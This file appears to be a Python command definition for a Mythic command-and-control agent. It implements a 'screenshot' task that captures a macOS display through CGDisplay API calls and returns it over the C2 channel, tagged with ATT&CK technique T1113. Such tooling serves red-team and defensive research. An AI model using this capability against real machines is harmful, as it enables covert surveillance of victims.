from CommandBase import *
import json
import datetime
from MythicResponseRPC import *


class ScreenshotArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {}

    async def parse_arguments(self):
        pass


class ScreenshotCommand(CommandBase):
    cmd = "screenshot"
    needs_admin = False
    help_cmd = "screenshot"
    description = "Use the built-in CGDisplay API calls to capture the display and send it back over the C2 channel. No need to specify any parameters as the current time will be used as the file name"
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_remove_file = False
    is_upload_file = False
    author = "@its_a_feature_"
    parameters = []
    attackmapping = ["T1113"]
    argument_class = ScreenshotArguments
    browser_script = BrowserScript(script_name="screenshot", author="@its_a_feature_")

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.args.command_line += str(datetime.datetime.utcnow())
        resp = await MythicResponseRPC(task).register_artifact(
            artifact_instance="$.CGDisplayCreateImage($.CGMainDisplayID());, $.NSBitmapImageRep.alloc.initWithCGImage(cgimage);",
            artifact_type="API Called",
        )
        return task

    async def process_response(self, response: AgentResponse):
        pass
